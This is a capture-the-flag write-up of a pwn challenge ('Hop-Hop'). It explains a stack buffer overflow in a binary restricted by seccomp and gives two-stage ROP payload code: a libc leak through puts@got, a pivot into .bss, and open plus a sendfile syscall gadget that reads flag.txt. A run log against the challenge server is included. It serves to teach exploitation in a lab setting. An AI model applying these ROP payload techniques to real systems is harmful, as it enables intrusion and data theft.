# **Hop-Hop - Pwn Challenge Writeup**

## **Challenge Overview**

* **Category**: Pwn
* **Author**: [Spinel99](https://github.com/MedjberAbderrahim)
* **Synopsis**: The challenge is a classic stack-based buffer overflow, but with a twist: the binary installs a **seccomp** filter that kills common useful syscalls (`execve`, `mmap`, `mprotect`, ...) and heavily restricts `read`/`write`.
  The binary reads user input with `fgets()` into a **72-byte** stack buffer, but passes **352** as the length, allowing us to overwrite saved **RBP** and **RIP**. We exploit this to:

  1. build a small ROP chain to **leak a libc address** using `puts(puts@got)`,
  2. compute the libc base (Ubuntu 24.04 / glibc **2.39**), then
  3. use a second-stage ROP to **open `flag.txt`** (via libc wrapper) and **exfiltrate it using `sendfile`** (since `read(fd!=0)` is blocked by seccomp).

## **Environment (Docker)**

The service is a minimal Ubuntu container that runs the challenge via `socat`:

```dockerfile
FROM ubuntu:24.04
...
COPY challenge/chall    /home/ctf/chall
COPY challenge/flag.txt /home/ctf/flag.txt
...
WORKDIR /home/ctf
EXPOSE 10003
CMD ["socat", "TCP-LISTEN:10003,reuseaddr,fork", "EXEC:/home/ctf/chall,stderr"]
```

* We extact the used libc & ld-interpreter from the environment (basically build/run it & `docker cp`)

Key takeaways:

* `GLIBC`'s Version: **glibc 2.39** (Ubuntu 24.04):
```sh
└─$ strings libc.so.6 | grep 'GNU C'
GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.6) stable release version 2.39.
```

<div style="page-break-after: always;"></div>

## **Static Analysis (IDA / Decompiled `main`)**

The important part of the challenge is in `main()`:
```c
int __fastcall main(int argc, const char **argv, const char **envp){
  char buf[72]; // [rsp+90h] [rbp-50h] BYREF
  __int64 ctx;  // [rsp+D8h] [rbp-8h]

  setup(argc, argv, envp);

  ctx = seccomp_init(2147418112LL);

  // lots of seccomp_rule_add(...) calls ...

  puts("Hop Hop little bunny, I am coming to eat you");
  puts("Hop Hop little bunny, I am coming to kill you\n");
  printf("What will you do? what CAN you do? ");
  fgets(buf, 352, stdin);
  return 0;
}
```

### **Stack Layout**

From the IDA stack comments:

```c
-0x50  char buf[72];
-0x08  int64 ctx;
+0x00  saved RBP
+0x08  saved RIP
```

### **Vulnerability**

The bug is simply:

```c
char buf[72];
fgets(buf, 352, stdin);
```

`fgets()` will happily write up to `352-1` bytes (+ a null terminator), so we can overwrite saved `RBP` and `RIP` and ROP from there.

<div style="page-break-after: always;"></div>

## **The Seccomp Filter**

The binary sets up a seccomp sandbox with default action `SCMP_ACT_ALLOW` and then **adds kill rules** for specific syscalls (paraphrasing the relevant parts):

* **Killed outright**:

  * `execve` (59), `execveat` (322)
  * `open` (2)
  * `fork` (57)
  * `mmap` (9), `mprotect` (10)
  * `pread64` (17), `readv` (19)
  * `pwrite64` (18), `writev` (20)

* **Restricted**:

  * `read` is killed unless **fd == 0**
  * `write` is killed unless **fd == 1**

### **Why this matters**

Even if we can open files, we can’t do the usual `open-read-write`, or even `execve('/bin/sh')`.

So the intended escape hatch is to use a syscall that transfers data **without calling `read(fd)`**, such as:

* `sendfile(out_fd=1, in_fd=fd, offset=NULL, count=...)`

OK so we know how to send data to `stdout` now, but how can we open the `flag.txt` file?

* Well, conveniently The filter blocks syscall **`open` (2)**, but *does not block* **`openat` (257)**.
  On modern glibc, the `open()` wrapper can end up using `openat(AT_FDCWD, ...)`, which is why calling `libc.sym['open']` can still work in this sandbox.

<div style="page-break-after: always;"></div>

## **Exploitation Strategy**

We solve it in **two stages**:

1. **Stage 1: leak libc + pivot into `.bss` (to avoid randomized input)**
2. **Stage 2: `open("flag.txt")` + `sendfile(1, fd, NULL, 0x40)`**

### **Stage 1 — Leak `puts` from the GOT**

We use the standard pattern:

* Set `RDI = puts@got`
* Call `puts()`

This prints the **8-byte function pointer** stored in the GOT as if it were a C string. Since a canonical x86_64 libc address ends with `\x00\x00`, `puts()` typically prints **6 bytes** before hitting a null byte — exactly why the solve script does `recv(6)` and pads to 8.

#### **Important trick: returning to a call-site inside `main`**

Instead of returning straight to `puts@plt`, the exploit returns to **`main + 997`** — a location inside `main()` that contains a *real* `call puts` instruction.

Why this is useful:

* A `call` instruction pushes its own return address (the next instruction in `main`) automatically.
* So after leaking, execution naturally continues in `main()` and reaches the prompt + `fgets()` **again**.

* [GDB](https://www.sourceware.org/gdb/) Disassmebly:
```sh
pwndbg> disassemble main
Dump of assembler code for function main:
   0x000000000040127d <+0>:     endbr64
   0x0000000000401281 <+4>:     push   rbp
...
   0x000000000040165d <+992>:   mov    edi,0x4023a0
   0x0000000000401662 <+997>:   call   0x4010d0 <puts@plt>
   0x0000000000401667 <+1002>:  mov    edi,0x4023d0
   0x000000000040166c <+1007>:  mov    eax,0x0
   0x0000000000401671 <+1012>:  call   0x4010f0 <printf@plt>
```

#### **RBP pivot into `.bss`**

The first stage also overwrites **saved RBP** with a writable/readable `.bss` address (via `exe.bss(0x800)`).

<div style="page-break-after: always;"></div>

* The `bss` in question:
```sh
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
        Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
        ...
        0x404000           0x405000 rw-p     1000   5000 chall
```

When `main` returns, the epilogue (`leave; ret`) loads this value into the **RBP register**.
Then, when we jump back into the middle of `main`, all stack-local references like `buf` are computed as `[rbp-0x50]` — meaning the next `fgets()` writes our second-stage payload into **`.bss` instead of the real stack**.

#### **Stage 1 payload (from `exploit.py`)**

```python
s  = b'A' * (offset_to_rip - 8)        # 80 bytes (to saved RBP)
s += p64(exe.bss(0x800))               # saved RBP = .bss pivot
s += p64(pop_rdi) + p64(exe.got.puts)  # RDI = puts@got
s += p64(exe.sym['main'] + 997)        # jump into main's call puts(...)
```

After receiving the leak, we subtract the base address of `puts` in LIBC from it to get base address of LIBC:

```python
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - libc.sym['puts']
```

### **Stage 2 — Get the flag with `open` + `sendfile`**

Now our input lands in `.bss`, which is perfect:

* stable addresses (non-PIE),
* plenty of room,
* and we can place both our ROP chain and the `"flag.txt\0"` string at known locations.

#### **Why `sendfile`**

Because seccomp only allows `read()` when `fd == 0`, we can’t read from the file descriptor returned by `open()`.
`sendfile()` avoids this by copying kernel-to-kernel from `in_fd` to `out_fd`.

We want:

```c
fd = open("flag.txt", O_RDONLY);           // likely returns 3
sendfile(1, fd, NULL, 0x40);               // write ~64 bytes to stdout
exit(0);
```

#### **Gadget constraints**

glibc 2.39 has a convenient `sendfile` syscall wrapper-like sequence:

1. We extract gadgets from libc using [ropper](https://github.com/sashs/Ropper) (better store the file to avoid repeating the command):
```sh
└─$ ropper --file libc.so.6 --nocolor > gadgets
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
```

2. We search for the appropriate gadget (always present because it is used in the `sendfile()` itself)
```sh
└─$ grep ': mov r10, rcx; mov eax, 0x28' gadgets
0x000000000011bbb4: mov r10, rcx; mov eax, 0x28; syscall; 
```

Since syscalls use `r10` for the 4th arg, we load `RCX = 0x40` and rely on the gadget to move it into `R10`.

Also, for `RDX` we only had a `pop rdx; leave; ret` gadget in this solve — so we intentionally **pivot** mid-chain using `leave; ret` to continue execution from a controlled `.bss` location (so we do not lose our previously setup ROP-Chain).

#### **Stage 2 payload layout**

* Place the string `flag.txt\0` at a known `.bss` address (`flag_str = 0x4048c0`)
* Call `open(flag_str, 0)`, it'll ALWAYS open on fd 3, because of linux behavior.
> Basically `stdin = 0; stdout = 1; stderr = 2`; so next fd opened by process will be always 3
* Set up registers for `sendfile(1, 3, NULL, 0x40)`
* Call the sendfile syscall gadget.
* `exit(0)` for cleaning, honestly don't even know if it's reached xD.

<div style="page-break-after: always;"></div>

## **Solve Script**

The full solver is provided in [`exploit.py`](./exploit.py)

## **Proof of Concept**

A typical run looks like:

```bash
└─$ ./exploit.py REMOTE
[+] Opening connection to 72.61.200.187 on port 10003: Done
libc.address: 0x7f716e027000
[*] Switching to interactive mode
shellmates{H0p_H0p_4w4y!!!}[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to 72.61.200.187 port 10003
```

## **Final Notes**

Really wanted to put some jail pwn challenge this time, as they are very rarely present in medium level CTFs, but really suffered & couldn't get a `chroot` escape chall, so here we are, having a `seccomp` one instead.

Anyway, hope you'all found this year's challenges good, either you learnt something new from them, or found them fun & entertaining, or even won some prizes off of them! see you next time hopefully, meanwhile, happy pwning!